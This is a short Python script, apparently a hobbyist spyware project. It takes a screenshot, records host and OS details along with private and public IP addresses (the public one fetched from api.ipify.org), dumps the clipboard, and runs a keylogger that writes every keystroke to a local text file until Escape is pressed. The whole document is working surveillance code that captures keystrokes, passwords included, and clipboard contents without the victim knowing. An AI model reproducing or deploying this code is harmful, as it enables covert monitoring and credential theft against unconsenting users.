# Libraries
import socket
import platform

import win32clipboard
from pynput.keyboard import Key, Listener
from requests import get
from PIL import ImageGrab

path = "C:\\Users\\hp"
x = "\\"

#screenshots
screenshot_picture = "screenshot.png"
def screeshot():
    img = ImageGrab.grab()
    img.save(path + x + screenshot_picture)
screeshot()


#information about the computer
computer_file = "computer_file.txt"
def computer_info ():
    with open(path + x + computer_file,"a") as file:
        host = socket.gethostname()
        IP_adress = socket.gethostbyname(host)
        try:
            ip_public = get("https://api.ipify.org").text
            file.write("The Public Ip Adress is  : " + ip_public)
        except Exception:
            file.write("The  Public Ip adress not found")

        file.write("System: " + platform.system() + " " + platform.version() + '\n')
        file.write("Machine: " + platform.machine() + "\n")
        file.write("Hostname: " + host + "\n")
        IPAddr = socket.gethostbyname(host)
        file.write("Private IP Address : " + IPAddr + "\n")
computer_info()

#clipboard info
clipboard_file = "clipboard_file.txt"
def clip_board():
    with open(path + x + clipboard_file , "a") as file:
        try:
            win32clipboard.OpenClipboard()
            text = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            file.write("ClipBoard: \n" + text)
        except:
            file.write("Error")
clip_board()

#keylogger

keys_file = "keys_file.txt"
cpt = 0
keys = []

def on_press(key):
    global keys , cpt
    print(key)
    keys.append(key)
    cpt+=1
    if cpt >=5:
        cpt = 0
        writing(keys)
        keys = []

def writing(keys):
    with open(path + x + keys_file ,"a") as file:
        for key in keys:
            a = str(key).replace("'","")
            if a.find("space") > 0:
                file.write('\n')
                file.close
            elif a.find("Key") == -1:
                file.write(a)
                file.close


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()


